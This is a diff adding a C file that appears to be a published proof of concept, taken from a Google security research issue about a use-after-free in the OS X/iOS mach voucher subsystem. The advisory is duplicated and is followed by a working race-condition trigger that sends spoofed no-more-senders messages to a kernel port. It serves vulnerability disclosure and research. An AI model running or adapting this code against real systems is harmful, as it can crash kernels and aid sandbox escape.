@@ -1,0 +1,251 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=553
+
+The mach voucher subsystem fails to correctly handle spoofed no-more-senders messages.
+
+ipc_kobject_server will be called for mach messages sent to kernel-owned mach ports.
+If the msgh_id of the message can't be found in the mig_buckets hash table then this function
+calls ipc_kobject_notify. Note that this is the same code path which would be taken for a
+real no-more-senders notification message but there's nothing stopping user-space from
+also just sending one.
+
+ipc_kobject_notify calls the correct notification method for the type of the KOBJECT associated with the port:
+
+
+boolean_t
+ipc_kobject_notify(
+                   mach_msg_header_t *request_header,
+                   mach_msg_header_t *reply_header)
+{
+    ipc_port_t port = (ipc_port_t) request_header->msgh_remote_port;
+    
+    ((mig_reply_error_t *) reply_header)->RetCode = MIG_NO_REPLY;
+    switch (request_header->msgh_id) {
+        case MACH_NOTIFY_NO_SENDERS:
+            if (ip_kotype(port) == IKOT_VOUCHER) {
+                ipc_voucher_notify(request_header);         <-- called unconditionally irregardless of the value of ip_srights
+                return TRUE;
+            }
+
+At this point there are also no locks held.
+
+void
+ipc_voucher_notify(mach_msg_header_t *msg)
+{
+  mach_no_senders_notification_t *notification = (void *)msg;
+  ipc_port_t port = notification->not_header.msgh_remote_port;
+  ipc_voucher_t iv;
+
+  assert(ip_active(port));
+  assert(IKOT_VOUCHER == ip_kotype(port));
+  iv = (ipc_voucher_t)port->ip_kobject;
+
+  ipc_voucher_release(iv);
+}
+
+
+ipc_voucher_notify calls ipc_voucher_release, again not taking any locks, which calls through to iv_release:
+
+void
+ipc_voucher_release(ipc_voucher_t voucher)
+{
+  if (IPC_VOUCHER_NULL != voucher)
+    iv_release(voucher);
+}
+
+
+static inline void
+iv_release(ipc_voucher_t iv)
+{
+  iv_refs_t refs;
+
+  assert(0 < iv->iv_refs);
+  refs = hw_atomic_sub(&iv->iv_refs, 1);
+  if (0 == refs)
+    iv_dealloc(iv, TRUE);
+}
+
+iv_release decrements the reference count field at +0x8 of the voucher object, and if it's zero frees it via iv_dealloc.
+
+We can send two spoofed no-more-senders notifications to a voucher mach port which will race each other to iv_release,
+one will free iv (via iv_dealloc) then the second will execute hw_atomic_sub and decrement the reference count field
+of a free'd object.
+
+With sufficient effort you could reallocate something else over the free'd ipc_voucher_t; you could then decrement the field at
++0x8 (and if that resulted in that field being zero you could free it.)
+
+You should enable kernel zone poisoning with the "-zp" boot arg to repro this.
+
+You should see a panic message like this:
+panic(cpu 2 caller 0xffffff800712922b): "a freed zone element has been modified in zone ipc vouchers: expected 0xdeadbeefdeadbeef but found 0xdeadbeefdeadbeee, bits changed 0x1, at offset 8 of 80 in element 
+
+This is consistent with the hw_atomic_sub call decrementing the refcount of a free'd object.
+
+Tested on OS X ElCapitan 10.11 (15A284)
+
+Presumably this is there on iOS too; I will update this bug if I can repro it there. I don't think there are any MAC hooks in the voucher subsystem so this should break you out of any sandboxes into the kernel.
+
+Note that you might have to leave the repro running for a little while to win the race.
+*/
+
+// ianbeer
+
+/*
+OS X and iOS unsandboxable kernel use-after-free in mach vouchers
+
+The mach voucher subsystem fails to correctly handle spoofed no-more-senders messages.
+
+ipc_kobject_server will be called for mach messages sent to kernel-owned mach ports.
+If the msgh_id of the message can't be found in the mig_buckets hash table then this function
+calls ipc_kobject_notify. Note that this is the same code path which would be taken for a
+real no-more-senders notification message but there's nothing stopping user-space from
+also just sending one.
+
+ipc_kobject_notify calls the correct notification method for the type of the KOBJECT associated with the port:
+
+
+boolean_t
+ipc_kobject_notify(
+                   mach_msg_header_t *request_header,
+                   mach_msg_header_t *reply_header)
+{
+    ipc_port_t port = (ipc_port_t) request_header->msgh_remote_port;
+    
+    ((mig_reply_error_t *) reply_header)->RetCode = MIG_NO_REPLY;
+    switch (request_header->msgh_id) {
+        case MACH_NOTIFY_NO_SENDERS:
+            if (ip_kotype(port) == IKOT_VOUCHER) {
+                ipc_voucher_notify(request_header);         <-- called unconditionally irregardless of the value of ip_srights
+                return TRUE;
+            }
+
+At this point there are also no locks held.
+
+void
+ipc_voucher_notify(mach_msg_header_t *msg)
+{
+  mach_no_senders_notification_t *notification = (void *)msg;
+  ipc_port_t port = notification->not_header.msgh_remote_port;
+  ipc_voucher_t iv;
+
+  assert(ip_active(port));
+  assert(IKOT_VOUCHER == ip_kotype(port));
+  iv = (ipc_voucher_t)port->ip_kobject;
+
+  ipc_voucher_release(iv);
+}
+
+
+ipc_voucher_notify calls ipc_voucher_release, again not taking any locks, which calls through to iv_release:
+
+void
+ipc_voucher_release(ipc_voucher_t voucher)
+{
+  if (IPC_VOUCHER_NULL != voucher)
+    iv_release(voucher);
+}
+
+
+static inline void
+iv_release(ipc_voucher_t iv)
+{
+  iv_refs_t refs;
+
+  assert(0 < iv->iv_refs);
+  refs = hw_atomic_sub(&iv->iv_refs, 1);
+  if (0 == refs)
+    iv_dealloc(iv, TRUE);
+}
+
+iv_release decrements the reference count field at +0x8 of the voucher object, and if it's zero frees it via iv_dealloc.
+
+We can send two spoofed no-more-senders notifications to a voucher mach port which will race each other to iv_release,
+one will free iv (via iv_dealloc) then the second will execute hw_atomic_sub and decrement the reference count field
+of a free'd object.
+
+With sufficient effort you could reallocate something else over the free'd ipc_voucher_t; you could then decrement the field at
++0x8 (and if that resulted in that field being zero you could free it.)
+
+You should enable kernel zone poisoning with the "-zp" boot arg to repro this.
+
+You should see a panic message like this:
+panic(cpu 2 caller 0xffffff800712922b): "a freed zone element has been modified in zone ipc vouchers: expected 0xdeadbeefdeadbeef but found 0xdeadbeefdeadbeee, bits changed 0x1, at offset 8 of 80 in element 
+
+This is consistent with the hw_atomic_sub call decrementing the refcount of a free'd object.
+
+Tested on OS X ElCapitan 10.11 (15A284)
+
+Presumably this is there on iOS too; I will update this bug if I can repro it there. I don't think there are any MAC hooks in the voucher subsystem so this should break you out of any sandboxes into the kernel.
+
+Note that you might have to leave the repro running for a little while to win the race.
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+#include <unistd.h>
+
+int start = 0;
+
+void go(void* arg){
+  mach_port_t v = 0xb03; // <-- works for me; ymmv
+  
+  mach_msg_header_t msg = {0};
+  msg.msgh_size = sizeof(mach_msg_header_t);
+  msg.msgh_local_port = v;
+  msg.msgh_remote_port = v;
+  msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
+  msg.msgh_id = 0106;
+
+  while(start == 0){;}
+
+  usleep(1);
+
+  mach_msg(&msg,
+           MACH_SEND_MSG,
+           msg.msgh_size,
+           0,
+           MACH_PORT_NULL,
+           MACH_MSG_TIMEOUT_NONE,
+           MACH_PORT_NULL);
+}
+int main() {
+  //char port_num[20] = {0};
+  //gets(port_num);
+  //mach_port_t v = (mach_port_t)atoi(port_num);
+  //printf("%x\n", v);
+
+  pthread_t t;
+  int arg = 0;
+  pthread_create(&t, NULL, (void*) go, (void*) &arg);
+
+  mach_port_t v = 0xb03;
+  
+  mach_msg_header_t msg = {0};
+  msg.msgh_size = sizeof(mach_msg_header_t);
+  msg.msgh_local_port = v;
+  msg.msgh_remote_port = v;
+  msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
+  msg.msgh_id = 0106;
+
+  usleep(100000);
+
+  start = 1;
+
+  mach_msg(&msg,
+           MACH_SEND_MSG,
+           msg.msgh_size,
+           0,
+           MACH_PORT_NULL,
+           MACH_MSG_TIMEOUT_NONE,
+           MACH_PORT_NULL);
+
+  pthread_join(t, NULL);
+
+  return 0;
+}
